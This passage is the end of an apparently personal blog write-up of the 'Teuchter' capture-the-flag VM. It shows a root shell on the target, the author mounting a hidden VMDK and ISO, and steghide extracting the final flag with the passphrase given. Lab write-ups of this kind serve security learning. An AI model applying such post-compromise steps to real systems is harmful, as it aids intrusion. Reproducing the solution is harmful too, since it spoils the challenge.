</pre></td><td class='code'><pre><code class=''><span class='line'>oot@teuchter:/root# ls -alh
</span><span class='line'>ls -alh
</span><span class='line'>total 1.1M
</span><span class='line'>drwx------  5 root root 4.0K Nov  2  2016 .
</span><span class='line'>drwxr-xr-x 23 root root 4.0K Nov  2  2016 ..
</span><span class='line'>drwx------  2 root root 4.0K Nov  2  2016 .aptitude
</span><span class='line'>-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
</span><span class='line'>drwx------  2 root root 4.0K Nov  2  2016 .cache
</span><span class='line'>-rw-r--r--  1 root root 1.1M Jul  9  2016 flag.jpg
</span><span class='line'>-rw-r--r--  1 root root  108 Sep 23  2016 flag.txt
</span><span class='line'>-rw-r--r--  1 root root  148 Aug 17  2015 .profile
</span><span class='line'>drwx------  3 root root 4.0K Aug  1  2016 re-record-not-fade-away
</span><span class='line'>-rw-r--r--  1 root root   75 Jul  9  2016 .selected_editor
</span><span class='line'>-rw-r--r--  1 root root   45 Oct 13 20:00 shells.tgz
</span><span class='line'>-rw-------  1 root root 3.4K Nov  2  2016 .viminfo</span></code></pre></td></tr></table></div></figure>


<p>Ah transfered the flag.jpg to my machine with netcat, but no metadata that could help. The text file is not the right one, obviously:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@teuchter:/root# cat flag.txt 
</span><span class='line'>cat flag.txt
</span><span class='line'>Ah say! Ah say! Ah say boy! Y'all interested in hochmagandy again...?
</span><span class='line'>
</span><span class='line'>Y'all know this aint the correct flag! </span></code></pre></td></tr></table></div></figure>


<p>Looking around further:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@teuchter:/root/re-record-not-fade-away# ls 
</span><span class='line'>ls 
</span><span class='line'>FeelsLikeHeaven  on
</span><span class='line'>cat FeelsLikeHeaven
</span><span class='line'>Yer pure no gonna find the flag... A pit it in a bottle of Red Kola</span></code></pre></td></tr></table></div></figure>


<p>The directory tree goes&hellip;on..and on&hellip;Ah used a Python script to solve this annoyance:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'>
</span><span class='line'><span class="n">startdir</span> <span class="o">=</span> <span class="s">&#39;.&#39;</span>
</span><span class='line'><span class="k">for</span> <span class="nb">dir</span><span class="p">,</span> <span class="n">subdir</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="n">startdir</span><span class="p">):</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="s">&#39;Found directory: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">dir</span><span class="p">)</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\t</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">f</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@teuchter:/root/re-record-not-fade-away# python3 dir.py
</span><span class='line'>python3 dir.py
</span><span class='line'>Found directory: .
</span><span class='line'>  FeelsLikeHeaven
</span><span class='line'>  dir.py
</span><span class='line'>Found directory: ./on
</span><span class='line'>Found directory: ./on/and
</span><span class='line'>Found directory: ./on/and/on
</span><span class='line'>Found directory: ./on/and/on/and
</span><span class='line'>Found directory: ./on/and/on/and/on
</span><span class='line'>Found directory: ./on/and/on/and/on/and
</span><span class='line'>Found directory: ./on/and/on/and/on/and/on
</span><span class='line'>Found directory: ./on/and/on/and/on/and/on/and
</span><span class='line'>Found directory: ./on/and/on/and/on/and/on/and/on
</span><span class='line'>Found directory: ./on/and/on/and/on/and/on/and/on/and
</span><span class='line'>Found directory: ./on/and/on/and/on/and/on/and/on/and/ariston
</span><span class='line'>  TeuchterESX.zip</span></code></pre></td></tr></table></div></figure>


<p>Inside this madness there&rsquo;s a 12M archive. Ah moved it to a sane location, transfered it to my machine, and attempted to extract it, but it was password protected. No need for cracking, guessing from all the options, the password is <em>Teuchter</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unzip TeuchterESX.zip 
</span><span class='line'>Archive:  TeuchterESX.zip
</span><span class='line'>[TeuchterESX.zip] TeuchterESX.vmdk password: 
</span><span class='line'>  inflating: TeuchterESX.vmdk        </span></code></pre></td></tr></table></div></figure>


<p>A VMDK disk. There&rsquo;s actually a hint for this inside root&rsquo;s crontab entries:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>## So vmfs-tools package eh....?
</span><span class='line'>*/5 * * * * /bin/sh /usr/local/bin/numpties.sh &gt; /dev/null 2&gt;&1</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what the package does:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apt-cache show vmfs-tools
</span><span class='line'>Package: vmfs-tools
</span><span class='line'>Source: vmfs-tools (0.2.5-1)
</span><span class='line'>Version: 0.2.5-1+b2
</span><span class='line'>Installed-Size: 256
</span><span class='line'>Maintainer: Mike Hommey &lt;glandium@debian.org&gt;
</span><span class='line'>Architecture: amd64
</span><span class='line'>Depends: libc6 (&gt;= 2.14), libfuse2 (&gt;= 2.6), libuuid1 (&gt;= 2.16)
</span><span class='line'>Size: 53964
</span><span class='line'>SHA256: 39379758d08827726308ea6ccf76de0cc403ba94d1bcdec9127a120bbf4b050a
</span><span class='line'>SHA1: 7db639825b49cabb9d9081dd22ca94813cf335b6
</span><span class='line'>MD5sum: ee9aa037a69d28f6db694632d0f7a106
</span><span class='line'>Description: Tools to access VMFS filesystems
</span><span class='line'> VMFS is a clustered filesystem designed to store virtual machine disks for
</span><span class='line'> VMware ESX or ESXi Server hosts. This set of tools allows to access these
</span><span class='line'> filesystems from some other non ESX/ESXi host for e.g. maintenance tasks.
</span><span class='line'> .
</span><span class='line'> Only read access is available at the moment, but write access is under
</span><span class='line'> works. Multiple extents are supported.
</span><span class='line'> .
</span><span class='line'> The VMFS can be accessed with a command line tool or mounted through a
</span><span class='line'> userspace filesystem (FUSE-based).
</span><span class='line'>Description-md5: 0cdea504f6c5a9da0070eeda2f011352
</span><span class='line'>Tag: admin::filesystem, admin::kernel, admin::virtualization,
</span><span class='line'> implemented-in::c, role::program
</span><span class='line'>Section: otherosfs
</span><span class='line'>Priority: extra
</span><span class='line'>Filename: pool/main/v/vmfs-tools/vmfs-tools_0.2.5-1+b2_amd64.deb</span></code></pre></td></tr></table></div></figure>


<p>Ah installed the package, and then hit a standstill on how to actually mount the virtual disk. After trying several approaches and failing, what worked was attaching the VMDK to my Kali virtual machine from the host. Ah had to change the compatibility of my VM for that to work, but it could possibly also work by editing the VMDK and changing <em>ddb.virtualHWVersion</em> to a version matching the VM&rsquo;s compatibility, but Ah haven&rsquo;t tried that. After doing it like that, Ah was able to see the disk under <em>/dev/sdb1</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fdisk -l
</span><span class='line'>Disk /dev/sdb: 2 GiB, 2147483648 bytes, 4194304 sectors
</span><span class='line'>Units: sectors of 1 * 512 = 512 bytes
</span><span class='line'>Sector size (logical/physical): 512 bytes / 512 bytes
</span><span class='line'>I/O size (minimum/optimal): 512 bytes / 512 bytes
</span><span class='line'>Disklabel type: gpt
</span><span class='line'>Disk identifier: AD5D7662-CD00-4621-AF02-68A05AD0A688
</span><span class='line'>
</span><span class='line'>Device     Start     End Sectors Size Type
</span><span class='line'>/dev/sdb1   2048 4194270 4192223   2G VMware VMFS
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disk /dev/sda: 40 GiB, 42949672960 bytes, 83886080 sectors
</span><span class='line'>Units: sectors of 1 * 512 = 512 bytes
</span><span class='line'>Sector size (logical/physical): 512 bytes / 512 bytes
</span><span class='line'>I/O size (minimum/optimal): 512 bytes / 512 bytes
</span><span class='line'>Disklabel type: dos
</span><span class='line'>Disk identifier: 0xa89dd27d
</span><span class='line'>
</span><span class='line'>Device     Boot    Start      End  Sectors Size Id Type
</span><span class='line'>/dev/sda1  *        2048 79693823 79691776  38G 83 Linux
</span><span class='line'>/dev/sda2       79695870 83884031  4188162   2G  5 Extended
</span><span class='line'>/dev/sda5       79695872 83884031  4188160   2G 82 Linux swap / Solaris</span></code></pre></td></tr></table></div></figure>


<p>Now Ah could mount it and see what&rsquo;s inside:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# vmfs-fuse /dev/sdb1 /mnt/vmdk
</span><span class='line'>root@kali:~# ls /mnt/vmdk
</span><span class='line'>hint.txt  redkola</span></code></pre></td></tr></table></div></figure>


<p>The hint mentions a password made of 25 characters that we should be able to find from what we&rsquo;ve been through:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat hint.txt 
</span><span class='line'>Almost there.. Check the ISO and remember password relates to the TV Advert ye watched.
</span><span class='line'>
</span><span class='line'>Ah took out the spaces but it's 25 characters but the Wikipedia page will get it for ye.</span></code></pre></td></tr></table></div></figure>


<p>In the redkola (Irn-Bru, anyone?) folder there are more VMDK files, but at least the hint focuses us on the ISO:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>oot@kali:/mnt/vmdk/redkola# ls
</span><span class='line'>redkola_1-flat.vmdk  redkola.iso    redkola.vmsd
</span><span class='line'>redkola_1.vmdk       redkola.nvram  redkola.vmx</span></code></pre></td></tr></table></div></figure>


<p>Ah mounted the ISO next:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount -o loop,ro redkola.iso /mnt/redkola
</span><span class='line'>root@kali:/mnt/redkola# ls
</span><span class='line'>glass_ch.jpg</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="/images/pentest/teuchter/glass_ch.jpg" title="glass cheque" alt="irn-bru!!!!!!"></p>

<p>All that Irn-Bru! And with something extra, perhaps? Enter steghide!</p>

<h4>steghide</h4>

<blockquote><p>Steghide  is a steganography program that is able to hide data in various kinds of
image- and audio-files. The color- respectivly sample-frequencies  are  not  changed thus making
the embedding resistant against first-order statistical tests.</p>

<p>Features include the compression of the embedded  data,  encryption  of
the  embedded  data  and automatic integrity checking using a checksum.
The JPEG, BMP, WAV and AU file formats are supported for use  as  cover
file. There are no restrictions on the format of the secret data.</p></blockquote>

<p>Steghide can also be used to check for the presence of a secret message and to extract it, if provided the correct passphrase. Putting together all the hints (scotland, girders, irn-bru wiki page) or just watching and listening to the advert gives us the passphrase <code>madeinscotlandfromgirders</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>steghide info glass_ch.jpg 
</span><span class='line'>"glass_ch.jpg":
</span><span class='line'>  format: jpeg
</span><span class='line'>  capacity: 3.9 KB
</span><span class='line'>Try to get information about embedded data ? (y/n) y
</span><span class='line'>Enter passphrase: 
</span><span class='line'>  embedded file "realflag.txt":
</span><span class='line'>    size: 972.0 Byte
</span><span class='line'>    encrypted: rijndael-128, cbc
</span><span class='line'>    compressed: yes</span></code></pre></td></tr></table></div></figure>


<p>Aaand, after much pain, we have the flag!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>steghide extract -sf glass_ch.jpg 
</span><span class='line'>Enter passphrase: 
</span><span class='line'>wrote extracted data to "realflag.txt".</span></code></pre></td></tr></table></div></figure>


<p>Achievement unlocked: Unlimited Irn-Bru!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat realflag.txt 
</span><span class='line'>
</span><span class='line'>Gaun Yersel Big Man! B-)
</span><span class='line'>
</span><span class='line'>Congratulations for the fifth time on capturing this flag!
</span><span class='line'>
</span><span class='line'>Yes, I know this VM has really got on your nerves, and that was the main
</span><span class='line'>point...
</span><span class='line'>
</span><span class='line'>I decided to have some fun with you, and hopefully you have learned some
</span><span class='line'>new ways to look at things. You know, all this could have been avoided
</span><span class='line'>if Siri just leanred what "outwith" means, I wouldn't have to build this
</span><span class='line'>VM. I'm trolling you again of course!
</span><span class='line'>
</span><span class='line'>I hope this VM was fun for you, and I'm sure you can now insult people
</span><span class='line'>in another language :-)
</span><span class='line'>
</span><span class='line'>Thanks to mrb3n who shared a joke with me and pushing me to set up a VM
</span><span class='line'>for trolling everyone.
</span><span class='line'>
</span><span class='line'>Shout-outs yet again to #vulnhub for hosting a great learning tool and
</span><span class='line'>being a great inspiration to make these VMs. A special thanks goes to
</span><span class='line'>mrb3n, cmaddy and GKNSB for repeated testing. Many thanks to g0tM1lk
</span><span class='line'>for providing some valuable feedback and offering to host my CTF again.
</span><span class='line'>                                                           --Knightmare</span></code></pre></td></tr></table></div></figure>


<p>This challenge cost me 1.5 days of the weekend, but it was funny as feck! And Ah learned a couple slang words that will sure come in handy. AND IRN-BRU!!! Which, in case ye haven&rsquo;t figured it out, stands for Iron Brew! Cheers, knightmare!</p>

<p>Just gonna leave this here:</p>

<p><img class="center" src="/images/pentest/teuchter/irn-bru.jpg" title="irn-bru" alt="iron brew effect"></p>

<p>And this:</p>

<ul>
<li><a href="https://foodanddrink.scotsman.com/drink/15-facts-about-irn-bru/">https://foodanddrink.scotsman.com/drink/15-facts-about-irn-bru/</a></li>
</ul>


<p>It&rsquo;s not over:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ When I'm a burger, Ah want to be washed \
</span><span class='line'>\ down with Irn-Bru                      /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>

      








  


<time datetime="2018-10-14T15:21:15+03:00" pubdate data-updated="true">Oct 14<span>th</span>, 2018</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2018/10/14/git-me-some-irn-bru-ye-teuchter/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2018/10/14/git-me-some-irn-bru-ye-teuchter/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2018/10/06/hack-the-imf/" title="Previous Post: Hack the IMF">&laquo; Hack the IMF</a>
      
      
        <a class="basic-alignment right" href="/blog/2018/10/20/skydog-con-ctf-2016-catch-me-if-you-can/" title="Next Post: SkyDog Con CTF 2016 - Catch Me If You Can">SkyDog Con CTF 2016 - Catch Me If You Can &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>whoami</h1>
  <p>switch (interests){<br>
 case INFORMATION SECURITY:<br>
Mostly offensive security, but trying to be well-rounded in everything;<br>
case PYTHON:<br>
Mainly security and sysadmin related scripting;<br>
case LINUX:<br>
Greetings from /dev/null;<br>
case JAPANESE:<br>
Language, anime, samurai;<br>
case MARTIAL ARTS:<br>
If it's fighting I like it;<br>
case MILITARY SCIENCE:<br>
Ancient, medieval, modern;<br>
default: GAMING;}</p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2019/04/15/donkey-docker/">Donkey Docker</a>
      </li>
    
      <li class="post">
        <a href="/blog/2019/04/07/hackfest-2016-orcus/">Hackfest 2016 Orcus</a>
      </li>
    
      <li class="post">
        <a href="/blog/2019/04/02/goldeneye-007/">GoldenEye 007</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/12/27/my-oswp-review/">My OSWP review</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/11/30/getting-in-the-w1r3s/">Getting in the W1R3S</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'chousensha',
            count: 5,
            skip_forks: true,
	    skip_repos: [ "chousensha.github.io" ],
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
  </ul>
  
    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
  
</section>

<section>
  <h1>Blogroll</h1>
  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2019 - chousensha -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'coredumpoverflow';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://chousensha.github.io/blog/2018/10/14/git-me-some-irn-bru-ye-teuchter/';
        var disqus_url = 'http://chousensha.github.io/blog/2018/10/14/git-me-some-irn-bru-ye-teuchter/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
